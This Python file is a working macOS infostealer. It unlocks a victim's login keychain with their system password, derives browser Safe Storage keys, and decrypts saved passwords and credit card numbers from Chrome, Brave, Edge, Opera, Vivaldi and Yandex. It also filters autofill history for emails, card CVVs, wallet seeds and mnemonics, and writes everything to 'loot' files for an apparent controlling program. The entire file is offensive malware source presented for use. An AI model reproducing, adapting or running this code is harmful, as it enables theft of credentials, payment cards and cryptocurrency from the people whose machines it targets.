
import os
import sys
import sqlite3
import argparse
import subprocess
import json
import uuid
import struct
import logging
import datetime

# Explicit imports to help PyInstaller find deps for dynamic modules
import binascii
import hashlib

# Check dependencies
try:
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ImportError:
    print("[-] Missing 'cryptography' library. Install it: pip3 install cryptography")
    sys.exit(1)

def derive_key(safe_storage_pwd):
    # Chrome on Mac usage:
    # Key = PBKDF2(safe_storage_pwd, salt='saltysalt', iterations=1003, length=16)
    # Hashing: SHA1
    salt = b'saltysalt'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=salt,
        iterations=1003,
        backend=default_backend()
    )
    return kdf.derive(safe_storage_pwd.encode('utf-8'))

def decrypt_password(encrypted_value, key):
    try:
        if not encrypted_value.startswith(b'v10'):
            return "Error:NotV10"
        
        data = encrypted_value[3:] # Strip 'v10'
        iv = b' ' * 16 # Fixed IV for Mac Chrome v10
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(data) + decryptor.finalize()
        
        # PKCS7 Unpadding
        # The last byte indicates the number of padding bytes
        padding_len = padded_data[-1]
        if padding_len < 1 or padding_len > 16:
             # Fallback if standard unpadding fails (sometimes it's just raw?)
             return padded_data.decode('utf-8', errors='ignore')
             
        decrypted = padded_data[:-padding_len]
        return decrypted.decode('utf-8')
        
    except Exception as e:
        return f"Error:{str(e)}"

def extract_safe_storage_key(keychain_path, password, service_name):
    print(f"[*] Extracting key from {keychain_path} using 'chainbreaker' (No UI)...")
    
    # Add chainbreaker from local repo to path
    if getattr(sys, 'frozen', False):
        # PyInstaller temp dir
        cb_repo = os.path.join(sys._MEIPASS, 'chainbreaker_repo')
    else:
        cb_repo = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'chainbreaker_repo')

    if cb_repo not in sys.path:
        sys.path.append(cb_repo)
        
    try:
        from chainbreaker import Chainbreaker
    except ImportError as e:
        print(f"[-] Chainbreaker import failed: {e}")
        # Fallback to security tool if import fails?
        # For now, let's fail loudly or revert to 'security' manually if needed.
        return None

    try:
        cb = Chainbreaker(keychain_path, unlock_password=password)
        
        # Check if unlocked
        if cb.locked and not cb.db_key:
             print("[-] Chainbreaker failed to unlock keychain (Wrong password?)")
             return None
             
        print("[*] Parsing keychain records...")
        # Dump generic passwords to find our replacement
        records = cb.dump_generic_passwords()
        
        for record in records:
            # Service name might be bytes or string, handle both
            svc = record.Service
            if isinstance(svc, bytes):
                svc = svc.decode('utf-8', errors='ignore')
                
            if svc == service_name:
                print(f"[+] Found '{service_name}' key via Chainbreaker!")
                return record.password
                
        print(f"[-] Key for service '{service_name}' not found in keychain.")
        return None

    except Exception as e:
        print(f"[-] Chainbreaker error: {e}")
        return None

# Browser base configs (service name is per-browser, not per-profile)
BROWSER_BASES = [
    {"name": "Google Chrome", "base": "Library/Application Support/Google/Chrome", "service": "Chrome Safe Storage"},
    {"name": "Brave", "base": "Library/Application Support/BraveSoftware/Brave-Browser", "service": "Brave Safe Storage"},
    {"name": "Vivaldi", "base": "Library/Application Support/Vivaldi", "service": "Vivaldi Safe Storage"},
    {"name": "Microsoft Edge", "base": "Library/Application Support/Microsoft Edge", "service": "Microsoft Edge Safe Storage"},
    {"name": "Yandex", "base": "Library/Application Support/Yandex/YandexBrowser", "service": "Yandex Safe Storage"},
    {"name": "Opera", "base": "Library/Application Support/com.operasoftware.Opera", "service": "Opera Safe Storage"},
]


def discover_browser_profiles(user_home):
    """Auto-discover all Chromium profiles with Login Data or Web Data for each browser."""
    found = []
    for b in BROWSER_BASES:
        base_path = os.path.join(user_home, b["base"])
        if not os.path.isdir(base_path):
            continue
        # Scan for profile dirs: Default, Profile 1, Profile 2, ...
        for entry in sorted(os.listdir(base_path)):
            if entry == "Default" or entry.startswith("Profile "):
                profile_dir = os.path.join(base_path, entry)
                login_data = os.path.join(profile_dir, "Login Data")
                web_data = os.path.join(profile_dir, "Web Data")
                if os.path.exists(login_data) or os.path.exists(web_data):
                    found.append({
                        "name": b["name"],
                        "profile": entry,
                        "login_data": login_data if os.path.exists(login_data) else None,
                        "web_data": web_data if os.path.exists(web_data) else None,
                        "service": b["service"],
                    })
    return found

import shutil

# ===================== AUTOFILL FIELD PATTERNS =====================

# Fields worth extracting from the raw autofill table
VALUABLE_PATTERNS = [
    'email', 'mail', 'login', 'username', 'user', 'phone', 'tel',
    'first_name', 'last_name', 'firstname', 'lastname', 'name',
    'card', 'expir', 'cvv', 'cvc', 'cardholder',
    'address', 'city', 'zip', 'postal', 'country', 'state',
    'wallet', 'seed', 'word-', 'mnemonic', 'secret', 'password', 'pass',
    'identifier', 'account', 'billing',
]

# Chromium address_type_tokens type IDs → human labels
ADDRESS_TYPE_MAP = {
    3: 'Honorific', 4: 'First Name', 5: 'Middle Name', 7: 'Full Name',
    9: 'Last Name', 30: 'Address Line 1', 31: 'Address Line 2',
    33: 'City', 34: 'State', 35: 'ZIP', 36: 'Country',
    60: 'Email', 77: 'Locality', 81: 'Phone',
    103: 'Company', 108: 'Street', 109: 'House Number',
}


def decrypt_db(db_path, keychain_path, password, service_name):
    """Decrypt Login Data (passwords). Returns (aes_key, list_of_password_lines)."""
    print(f"\n[*] Processing: {db_path}", file=sys.stderr)

    safe_storage_pwd = extract_safe_storage_key(keychain_path, password, service_name)
    if not safe_storage_pwd:
        return None, []

    try:
        aes_key = derive_key(safe_storage_pwd)
    except Exception as e:
        print(f"[-] Key derivation failed: {e}", file=sys.stderr)
        return None, []

    temp_db = db_path + ".temp"
    try:
        shutil.copy2(db_path, temp_db)
    except Exception as e:
        print(f"[-] Could not copy DB: {e}", file=sys.stderr)
        temp_db = db_path

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    except Exception as e:
        print(f"[-] DB Error: {e}", file=sys.stderr)
        if temp_db != db_path and os.path.exists(temp_db):
            os.remove(temp_db)
        return None, []

    lines = []
    for url, user, encrypted_password in cursor.fetchall():
        decrypted_password = decrypt_password(encrypted_password, aes_key)
        if decrypted_password.startswith("Error"):
            continue
        lines.append(f"URL: {url}")
        lines.append(f"User: {user}")
        lines.append(f"Pass: {decrypted_password}")
        lines.append("-" * 60)

    conn.close()
    if temp_db != db_path and os.path.exists(temp_db):
        try: os.remove(temp_db)
        except: pass

    print(f"[+] {len(lines) // 4} passwords from {db_path}", file=sys.stderr)
    return aes_key, lines


def decrypt_webdata(db_path, aes_key, browser_label):
    """Parse Web Data. Returns (cards_lines, autofill_lines)."""
    print(f"[*] Web Data: {browser_label}", file=sys.stderr)

    temp_db = db_path + ".temp"
    try:
        shutil.copy2(db_path, temp_db)
    except Exception as e:
        print(f"[-] Could not copy Web Data: {e}", file=sys.stderr)
        temp_db = db_path

    try:
        conn = sqlite3.connect(temp_db)
        conn.text_factory = lambda b: b.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"[-] Web Data DB Error: {e}", file=sys.stderr)
        if temp_db != db_path and os.path.exists(temp_db):
            os.remove(temp_db)
        return [], []

    cards_lines = []
    autofill_lines = []

    # --- 1. Credit Cards (encrypted) ---
    try:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT name_on_card, expiration_month, expiration_year, "
            "card_number_encrypted, origin, nickname FROM credit_cards"
        )
        for name, month, year, encrypted_num, origin, nickname in cursor.fetchall():
            card_num = decrypt_password(encrypted_num, aes_key) if encrypted_num else "(empty)"
            if card_num.startswith("Error"):
                card_num = "(decrypt failed)"
            cards_lines.append(f"Card: {card_num}")
            cards_lines.append(f"Name: {name}")
            cards_lines.append(f"Expires: {month:02d}/{year}")
            if nickname:
                cards_lines.append(f"Nickname: {nickname}")
            if origin:
                cards_lines.append(f"Origin: {origin}")
            cards_lines.append("-" * 60)
    except Exception as e:
        print(f"[-] Credit cards table error: {e}", file=sys.stderr)

    # --- 2. Structured Addresses → autofill file ---
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT guid, use_count FROM addresses")
        addresses = cursor.fetchall()
        if addresses:
            autofill_lines.append(f"=== Saved Addresses ({len(addresses)}) ===")
            for guid, use_count in addresses:
                cursor.execute(
                    "SELECT type, value FROM address_type_tokens "
                    "WHERE guid=? AND value != ''", (guid,)
                )
                tokens = cursor.fetchall()
                if tokens:
                    autofill_lines.append(f"\nAddress (used {use_count}x):")
                    for typ, val in tokens:
                        label = ADDRESS_TYPE_MAP.get(typ, f"Field_{typ}")
                        autofill_lines.append(f"  {label}: {val}")
            autofill_lines.append("")
    except Exception as e:
        print(f"[-] Addresses table error: {e}", file=sys.stderr)

    # --- 3. Autofill (filtered plaintext) ---
    try:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT name, value, count, date_last_used FROM autofill "
            "ORDER BY date_last_used DESC"
        )
        rows = cursor.fetchall()
        if rows:
            autofill_lines.append(f"=== Autofill Form History ===")
            count = 0
            for fname, fval, cnt, last_used in rows:
                fl = fname.lower()
                if any(p in fl for p in VALUABLE_PATTERNS):
                    try:
                        dt = datetime.datetime.fromtimestamp(last_used).strftime('%Y-%m-%d')
                    except:
                        dt = str(last_used)
                    autofill_lines.append(f"  {fname} = {fval}  ({cnt}x, {dt})")
                    count += 1
            autofill_lines.append(f"  --- {count} valuable of {len(rows)} total ---")
    except Exception as e:
        print(f"[-] Autofill table error: {e}", file=sys.stderr)

    conn.close()
    if temp_db != db_path and os.path.exists(temp_db):
        try: os.remove(temp_db)
        except: pass

    cc = len([l for l in cards_lines if l.startswith("Card:")])
    af = len([l for l in autofill_lines if l.startswith("  ") and "=" in l])
    print(f"[+] Web Data {browser_label}: {cc} cards, {af} autofill entries", file=sys.stderr)
    return cards_lines, autofill_lines


def write_file(path, lines):
    """Write lines to file, creating dirs if needed."""
    d = os.path.dirname(path)
    if d and not os.path.exists(d):
        os.makedirs(d, exist_ok=True)
    with open(path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(lines))


def main():
    parser = argparse.ArgumentParser(description="Decrypt Chrome Login Data + Web Data (Mac)")
    parser.add_argument("--password", required=True, help="Victim's system password")
    parser.add_argument("--auto", action="store_true", help="Auto-find and decrypt all browsers")
    parser.add_argument("--loot-dir", help="Directory to write output files (3 separate files)")
    parser.add_argument("--db", help="Path to 'Login Data' file (manual mode)")
    parser.add_argument("--keychain", help="Path to 'login.keychain-db' (manual mode)")
    parser.add_argument("--service", default="Chrome Safe Storage", help="Keychain Service Name")

    args = parser.parse_args()
    user_home = os.path.expanduser("~")

    if args.auto:
        print(f"[*] Starting Auto-Discovery on {os.uname().nodename}...", file=sys.stderr)

        keychain_path = os.path.join(user_home, "Library/Keychains/login.keychain-db")
        if not os.path.exists(keychain_path):
            print(f"[-] Default keychain not found at {keychain_path}", file=sys.stderr)
            sys.exit(1)

        # Aggregated data across all browsers
        all_passwords = []
        all_cards = []
        all_autofill = []

        browser_profiles = discover_browser_profiles(user_home)
        for bp in browser_profiles:
            label = f"{bp['name']}" if bp['profile'] == 'Default' else f"{bp['name']} ({bp['profile']})"
            aes_key = None

            # --- Passwords ---
            if bp['login_data']:
                aes_key, pw_lines = decrypt_db(bp['login_data'], keychain_path, args.password, bp['service'])
                if pw_lines:
                    all_passwords.append(f"=== {label} ===")
                    all_passwords.extend(pw_lines)
                    all_passwords.append("")

            # --- Web Data ---
            if bp['web_data']:
                if aes_key is None:
                    safe_pwd = extract_safe_storage_key(keychain_path, args.password, bp['service'])
                    if safe_pwd:
                        try: aes_key = derive_key(safe_pwd)
                        except: pass

                if aes_key:
                    cc_lines, af_lines = decrypt_webdata(bp['web_data'], aes_key, label)
                    if cc_lines:
                        all_cards.append(f"=== {label} ===")
                        all_cards.extend(cc_lines)
                        all_cards.append("")
                    if af_lines:
                        all_autofill.append(f"=== {label} ===")
                        all_autofill.extend(af_lines)
                        all_autofill.append("")

        # --- Write output ---
        pw_count = len([l for l in all_passwords if l.startswith("Pass:")])
        cc_count = len([l for l in all_cards if l.startswith("Card:")])
        af_count = len([l for l in all_autofill if l.startswith("  ") and "=" in l])

        if args.loot_dir:
            loot = args.loot_dir
            if all_passwords:
                write_file(os.path.join(loot, 'passwords_decrypted.txt'), all_passwords)
            if all_cards:
                write_file(os.path.join(loot, 'credit_cards_decrypted.txt'), all_cards)
            if all_autofill:
                write_file(os.path.join(loot, 'autofill.txt'), all_autofill)
        else:
            # Legacy: print everything to stdout
            for section, title in [(all_passwords, "PASSWORDS"), (all_cards, "CREDIT CARDS"), (all_autofill, "AUTOFILL")]:
                if section:
                    print(f"\n{'=' * 60}")
                    print(f"  {title}")
                    print(f"{'=' * 60}")
                    print('\n'.join(section))

        # JSON summary to stdout — main.ts parses this
        summary = json.dumps({"passwords": pw_count, "cards": cc_count, "autofill": af_count})
        print(summary)

    else:
        if not args.db or not args.keychain:
            print("[-] Error: --db and --keychain required for manual mode (or use --auto).", file=sys.stderr)
            sys.exit(1)
        _, pw_lines = decrypt_db(args.db, args.keychain, args.password, args.service)
        if pw_lines:
            print('\n'.join(pw_lines))

if __name__ == "__main__":
    main()
